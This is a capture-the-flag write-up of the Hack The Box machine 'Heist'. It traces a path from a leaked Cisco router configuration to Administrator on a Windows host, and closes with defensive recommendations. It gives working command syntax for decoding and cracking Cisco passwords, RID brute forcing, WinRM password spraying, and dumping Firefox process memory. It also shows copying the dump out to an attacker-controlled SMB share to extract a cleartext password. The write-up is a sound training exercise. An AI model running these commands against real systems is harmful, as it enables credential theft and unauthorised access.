---
title: "Heist — Cisco Config Leak to Firefox Credential Extraction"
description: "A leaked Cisco configuration yields SMB and WinRM access, then Firefox process memory recovery exposes the Administrator password."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - credential-reuse
  - process-dump
objective: "Escalate from guest portal access to local Administrator via leaked network-device credentials and browser process memory."
tools:
  - nmap
  - curl
  - passlib
  - john
  - NetExec
  - procdump
  - impacket-smbserver
  - strings
skill: "Credential recovery and reuse across network, SMB, and WinRM services; browser process memory analysis"
outcome: "WinRM command execution as local Administrator after recovering the password from Firefox process memory"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows host running IIS 10.0 with SMB and WinRM |
| Starting position | Unauthenticated network access with a guest-accessible portal |
| Objective | Escalate from guest portal access to local Administrator |
| Outcome | WinRM command execution as local Administrator |

## From a guest portal to browser memory

Heist is a retired Easy Hack The Box Windows machine that reaches administrative control without a privilege-escalation exploit: a guest-accessible support portal leaks a Cisco router configuration, and the recovered credentials carry the chain through SMB, WinRM, and browser process memory. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Guest support portal → leaked Cisco configuration → decoded type 7 and cracked type 5 credentials → SMB access as `<LOW_PRIVILEGE_USER>` → RID brute force → password spray → WinRM as `<WINRM_USER>` → Firefox process dump → Administrator credential from browser memory → WinRM as Administrator**

## IIS support portal, SMB, and WinRM surfaces

The machine exposes a Microsoft IIS support portal on port 80, SMB on port 445, and WinRM on port 5985. The portal has a guest login and an issues tracker, where an attachment links a Cisco router configuration file. The objective is to trace an attack path from guest-level portal access to full administrative control of the host.

## Evidence: leaked router config to browser memory

### 1. Service Enumeration

Observation: a service scan exposes an IIS web application, SMB, and WinRM.

```bash
nmap -Pn -sC -sV -oA <SCAN_PREFIX> <TARGET_IP>
```

Truncated scan output:

```text
Nmap scan report for <TARGET_HOST> (<TARGET_IP>)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Significance: the support portal is the only interactive application surface, while SMB and WinRM become useful once credentials are recovered.

Result: a Windows host exposing an IIS support portal, SMB, and WinRM.

### 2. Guest Portal Access and Cisco Configuration Extraction

Observation: guest login redirects to the issues tracker, whose attachment is readable without any further authentication.

```bash
curl -i 'http://<TARGET_IP>/login.php?guest=true'
```

```text
HTTP/1.1 302 Found
Location: issues.php
Set-Cookie: PHPSESSID=...
```

```bash
curl http://<TARGET_IP>/attachments/config.txt
```

```text
version 12.2
service password-encryption
hostname <ROUTER_HOSTNAME>

enable secret 5 <TYPE5_HASH>

username <ROUTER_USER> password 7 <TYPE7_HASH_ROUTER>
username <ROUTER_ADMIN> privilege 15 password 7 <TYPE7_HASH_ADMIN>
```

Significance: the portal leaks a network-device configuration containing three reusable credential artifacts: an MD5-crypt (type 5) enable secret and two reversible (type 7) account passwords.

Result: guest access alone exposes the full router configuration, with no authenticated portal session required.

### 3. Cisco Credential Recovery

Observation: the type 7 values are reversible, while the type 5 enable secret is a fast MD5-crypt cracking target.

```bash
python3 - <<'PY'
from passlib.hash import cisco_type7
for enc in ["<TYPE7_HASH_ROUTER>", "<TYPE7_HASH_ADMIN>"]:
    print(f"{enc} -> {cisco_type7.decode(enc)}")
PY
```

```text
<TYPE7_HASH_ROUTER> -> <ROUTER_USER_PASSWORD>
<TYPE7_HASH_ADMIN> -> <ROUTER_ADMIN_PASSWORD>
```

```bash
john --wordlist=<WORDLIST> --format=md5crypt <HASH_FILE>
```

```text
<ENABLE_SECRET>    (?)
```

Significance: the type 7 passwords recover instantly by decoding, and the enable secret falls to a dictionary attack on a common wordlist; no cryptographic weakness in MD5 is needed.

Result: three credentials are recovered: `<ROUTER_USER_PASSWORD>` for `<ROUTER_USER>`, `<ROUTER_ADMIN_PASSWORD>` for `<ROUTER_ADMIN>`, and `<ENABLE_SECRET>` from the enable secret.

### 4. SMB Authentication and RID Brute Force

Observation: the recovered enable secret authenticates over SMB for the issue author's username, which is visible in the portal.

```bash
nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<ENABLE_SECRET>'
```

```text
SMB  <TARGET_IP>  445  <TARGET_HOST>  [+] <TARGET_HOST>\<LOW_PRIVILEGE_USER>:<ENABLE_SECRET>
```

Significance: any valid SMB account unlocks RID brute-force enumeration of the local SAM.

```bash
nxc smb <TARGET_IP> -u <LOW_PRIVILEGE_USER> -p '<ENABLE_SECRET>' --rid-brute
```

```text
<RID_1>: <TARGET_HOST>\Administrator (SidTypeUser)
<RID_2>: <TARGET_HOST>\Guest (SidTypeUser)
<RID_3>: <TARGET_HOST>\DefaultAccount (SidTypeUser)
<RID_4>: <TARGET_HOST>\WDAGUtilityAccount (SidTypeUser)
<RID_5>: <TARGET_HOST>\<LOW_PRIVILEGE_USER> (SidTypeUser)
<RID_6>: <TARGET_HOST>\<SUPPORT_USER> (SidTypeUser)
<RID_7>: <TARGET_HOST>\<WINRM_USER> (SidTypeUser)
<RID_8>: <TARGET_HOST>\<ADDITIONAL_USER> (SidTypeUser)
```

Result: authenticated SMB access is obtained, and the local user list (including `<SUPPORT_USER>`, `<WINRM_USER>`, and `<ADDITIONAL_USER>`) is enumerated.

### 5. Password Spray to WinRM

Observation: the three recovered passwords are sprayed against the enumerated usernames over WinRM.

```bash
nxc winrm <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success
```

```text
WINRM  <TARGET_IP>  5985  <TARGET_HOST>  [+] <TARGET_HOST>\<WINRM_USER>:<ROUTER_ADMIN_PASSWORD> (Pwn3d!)
```

Significance: the same value recovered from the router `<ROUTER_ADMIN>` account is reused for the Windows account `<WINRM_USER>`, so the leaked secret crosses from the network device into a host login. The `(Pwn3d!)` marker shows the credentials permit command execution over WinRM.

Result: WinRM command execution is obtained as `<WINRM_USER>`.

### 6. Local Enumeration and Firefox Process Targeting

Observation: a desktop todo note shows the user monitors the portal, and a process listing shows Firefox running in the same user context.

```bash
nxc winrm <TARGET_IP> -u <WINRM_USER> -p '<ROUTER_ADMIN_PASSWORD>' -x 'type C:\Users\<WINRM_USER>\Desktop\todo.txt'
```

```text
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

```bash
nxc winrm <TARGET_IP> -u <WINRM_USER> -p '<ROUTER_ADMIN_PASSWORD>' -x 'Get-Process | Select-Object Id,ProcessName,Path | Format-Table -AutoSize'
```

```text
Id    ProcessName  Path

6368  firefox      C:\Program Files\Mozilla Firefox\firefox.exe
6476  firefox      C:\Program Files\Mozilla Firefox\firefox.exe
```

Significance: a browser session actively used against the portal is a likely home for a submitted credential, so browser memory is the direct target instead of a blind process dump.

Result: Firefox processes running under `<WINRM_USER>` are identified as the likely credential source.

### 7. Firefox Process Dump and Administrator Credential Extraction

Observation: a full dump of the Firefox process is taken and searched for the portal's login form parameter.

```bash
procdump.exe -ma firefox.exe firefox.dmp
```

```text
Dump 1 initiated: firefox.exe -> firefox.dmp
```

The dump is moved to the attacking host over an SMB share, served with `smbserver.py`, and searched on disk.

```bash
smbserver.py -smb2support -username <SMB_USER> -password <SMB_PASSWORD> share <SHARE_DIR>
```

```cmd
net use Z: \\<ATTACKER_HOST>\share /user:<SMB_USER> <SMB_PASSWORD>
copy firefox.dmp Z:\
```

```bash
strings -el firefox.dmp | grep -i 'login_password'
```

```text
localhost/login.php?login_username=<ADMIN_USER>@<TARGET_DOMAIN>&login_password=<ADMIN_PASSWORD>&login=
```

Significance: the submitted login URL persists in process memory as cleartext, so the password is recovered directly, with no guessing or brute force.

Result: the recovered credential authenticates as the Windows Administrator over WinRM.

```bash
nxc winrm <TARGET_IP> -u administrator -p '<ADMIN_PASSWORD>'
```

```text
WINRM  <TARGET_IP>  5985  <TARGET_HOST>  [+] <TARGET_HOST>\administrator:<ADMIN_PASSWORD> (Pwn3d!)
```

## Challenges: rejected creds, sparse usernames, and dump targeting

- The recovered router credentials were wrong for the web login form, so the path pivoted away from the portal to SMB and WinRM.
- Only the issue author's username was visible initially, so to supply usernames for the password spray, I checked the RID brute-force result; the spray then revealed the reuse on `<WINRM_USER>`.
- Correlating the todo note with the process listing made the dump targeted: both pointed to active browser use, so dumping a single `firefox.exe` process was the most direct route to a stored credential.

## Outcome: local Administrator WinRM from browser memory

The path reaches Administrator from unauthenticated access: secrets leaked from a guest-reachable device configuration were reused across SMB and WinRM, and the final Administrator credential was validated only over WinRM. The final escalation did not require a kernel exploit.

## Recommendations: device configs, weak secrets, reuse, RID enumeration, and browser memory

The actions below remain recommendations; this case study did not test them.

1. **Guest-accessible device configuration.** An unauthenticated guest could retrieve a router configuration holding three credential artifacts. *Preventive:* require authentication and authorization on issue attachments and keep device configurations out of web-accessible storage. *Detective:* monitor access to configuration or export files from guest sessions.
2. **Reversible and weak secrets on network devices.** Cisco type 7 values decode directly and the type 5 MD5-crypt enable secret fell to a dictionary attack. *Preventive:* migrate to non-reversible password types (type 8 PBKDF2-SHA256 or type 9 scrypt) and remove type 5 and type 7 secrets.
3. **Credential reuse across infrastructure and Windows accounts.** The router `<ROUTER_ADMIN>` password also authenticated `<WINRM_USER>`, and the cracked enable secret authenticated SMB. *Preventive:* issue unique credentials per system tier and rotate shared secrets. *Detective:* monitor for one secret used against multiple services.
4. **Unauthenticated RID enumeration.** Any valid SMB account enumerated every local user, enabling a targeted spray. *Preventive/detective:* restrict low-privileged local SAM enumeration and monitor for RID brute-force patterns.
5. **Credentials retained in browser memory.** A submitted portal login URL remained in Firefox memory as plaintext, yielding the Administrator password. *Preventive:* avoid signing into privileged interfaces from shared or monitored sessions and clear sensitive browser state. *Detective:* monitor for process dumps of browser processes, the `procdump` pattern used here.

## References

- [Hack The Box — Heist](https://app.hackthebox.com/machines/Heist) (retired Windows machine)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and WinRM authentication, RID brute force, and command execution)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [passlib — Cisco type 7 hash](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.cisco_type7.html) (reversible Cisco password decoding)
- [John the Ripper](https://github.com/openwall/john) (MD5-crypt dictionary cracking)
- [Sysinternals ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) (browser process memory capture)
- [curl](https://curl.se/docs/manpage.html) (HTTP requests against the portal)
